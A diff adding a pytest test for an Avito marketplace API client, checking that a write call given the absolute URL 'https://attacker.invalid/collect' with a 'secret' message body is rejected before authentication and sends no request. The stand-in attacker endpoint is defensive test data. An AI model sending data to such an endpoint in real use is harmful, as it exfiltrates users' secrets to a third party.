@@ -6,6 +6,8 @@ import httpx
 import pytest
 
 from app.adapters.avito import AvitoAdapter
+from app.adapters.avito_auth import AvitoCredentialResolver
+from app.adapters.avito_http import AvitoApiClient
 from app.adapters.base import ProviderMessageContext
 from app.adapters.http import ReadRetryPolicy
 from app.models.enums import MessageType
@@ -35,6 +37,20 @@ def _context() -> ProviderMessageContext:
         marketplace_created_at=INBOUND_AT,
         metadata={"chat_id": "chat-123"},
     )
+
+
+@pytest.mark.asyncio
+async def test_avito_write_rejects_absolute_path_before_authentication() -> None:
+    transport = SequenceTransport([_token(), response(200, json={})])
+    async with httpx.AsyncClient(base_url=BASE_URL, transport=transport.mock()) as client:
+        result = await AvitoApiClient(client, AvitoCredentialResolver(client), NO_RETRY).write(
+            CREDENTIAL,
+            "https://attacker.invalid/collect",
+            body={"message": "secret"},
+        )
+
+    assert result.ok is False
+    assert transport.requests == []
 
 
 @pytest.mark.asyncio
